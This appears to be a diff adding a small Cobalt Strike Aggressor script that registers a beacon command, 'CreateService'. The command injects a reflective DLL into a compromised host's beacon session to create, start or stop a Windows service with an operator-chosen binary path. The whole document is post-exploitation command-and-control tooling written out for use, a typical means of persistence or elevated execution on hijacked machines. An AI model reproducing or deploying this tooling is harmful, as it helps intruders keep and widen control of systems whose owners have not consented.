@@ -1,0 +1,11 @@
+$dll = "reflective_dll.dll";
+beacon_command_register(
+	"CreateService", 
+	"CreateService beacon log", 
+	"Synopsis: CreateService [BinaryPathName] [ServiceName] [start/stop] \n");
+
+alias("CreateService", {
+    $args = substr($0, 14);
+    bdllspawn($1, script_resource($dll), $args, "CreateService ....", 10000, false);
+	blog($1, "arguments are:" . substr($0, 14));
+});
